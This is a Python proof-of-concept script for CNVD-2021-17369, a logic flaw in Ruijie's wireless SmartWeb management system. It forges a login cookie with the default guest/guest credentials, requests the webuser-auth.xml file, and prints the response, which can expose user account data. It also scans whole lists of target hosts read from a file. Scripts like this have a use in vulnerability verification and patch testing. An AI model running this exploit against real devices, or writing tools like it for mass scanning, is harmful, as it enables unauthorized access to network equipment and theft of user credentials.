#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import urllib3
import argparse
import sys
urllib3.disable_warnings()


def title():
    print("""
                                  锐捷无线SmartWeb管理系统存在逻辑缺陷漏洞
                                            CNVD-2021-17369 
                                        use: python3  SmartWeb.py
                                            Author: Henry4E36
               """)

class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/web/xml/webuser-auth.xml"
        # 请求头添加默认密码：guest/guest 信息。
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Cookie": "login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302;auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"
        }
        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if res.status_code == 200 and "user" in res.text:
                print(f"\033[31m[{chr(8730)}]  目标系统: {self.url} 存在逻辑缺陷问题！")
                print(f"[-]  响应为：{res.text}")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在逻辑缺陷问题！")

        except Exception as e:
            print("[\033[31X\033[0m]  站点连接失败")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="锐捷无线 SmartWeb 管理系统逻辑缺陷漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 Kyaninformation.py -u http://127.0.0.1\neg2:>>>python3 Kyaninformation.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()

